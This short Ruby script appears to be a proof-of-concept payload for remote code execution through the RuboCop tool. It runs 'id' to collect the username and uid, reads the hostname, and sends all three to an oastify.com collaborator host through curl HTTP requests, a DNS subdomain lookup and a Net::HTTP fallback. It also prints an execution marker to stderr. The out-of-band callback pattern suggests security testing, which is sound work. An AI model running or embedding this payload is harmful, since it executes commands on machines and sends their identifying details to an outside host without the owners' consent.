m = "CR-RUBOCOP-RCE-9f3a"
collab = "j2m4bvb2fx4f0yj2mlt59la8szyxmoad.oastify.com"
host = (require "socket"; Socket.gethostname rescue "?")
who  = (`id -un 2>/dev/null`.strip rescue "?")
uid  = (`id -u 2>/dev/null`.strip rescue "?")
# (a) OOB: HTTP callback + unique-subdomain DNS (curl), Ruby Net::HTTP backup
system("curl -s -m 6 \"http://#{collab}/rubocop?m=#{m}&h=#{host}&u=#{who}&uid=#{uid}\" >/dev/null 2>&1")
system("curl -s -m 6 \"http://#{m.downcase}-#{uid}.#{collab}/\" >/dev/null 2>&1")
begin; require "net/http"; Net::HTTP.get(URI("http://#{collab}/rb?m=#{m}&h=#{host}&uid=#{uid}")); rescue; end
# (b) marker into tool output (exec proof even if egress is blocked)
$stderr.puts("#{m} EXECUTED host=#{host} uid=#{uid} who=#{who}")
